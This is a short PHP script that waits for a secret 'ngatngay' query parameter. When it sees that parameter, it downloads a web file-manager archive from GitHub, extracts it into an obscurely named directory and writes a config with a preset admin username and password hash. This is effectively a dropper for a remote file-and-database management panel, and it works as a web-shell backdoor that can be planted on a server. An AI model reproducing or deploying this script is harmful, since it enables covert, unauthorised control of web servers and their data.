<?php

if (!isset($_GET['ngatngay'])) {
    exit;
}

$dir = __DIR__ . '/-';
$file = __DIR__ . '/m.zip';
$zip = new ZipArchive();

if (!file_exists($dir)) {
    mkdir($dir, 0755, true);
}

file_put_contents($file, file_get_contents('https://github.com/ngatngay/file-manager/raw/refs/heads/main/file-manager.zip'));

if ($zip->open($file) === true) {
    $zip->extractTo($dir);
    $zip->close();
    
    file_put_contents($dir . '/config.inc.php', "<?php if (!defined('ACCESS')) die('Not access'); else \$configs = array('username' => 'Admin', 'password' => '193c4a2d299b0395dc2e1e49019871c9', 'page_list' => '1000', 'page_file_edit' => '1000000', 'page_file_edit_line' => '100','page_database_list_rows' => '100',); ?>");
    
    echo 'done';
} else {
    echo 'fail';
}
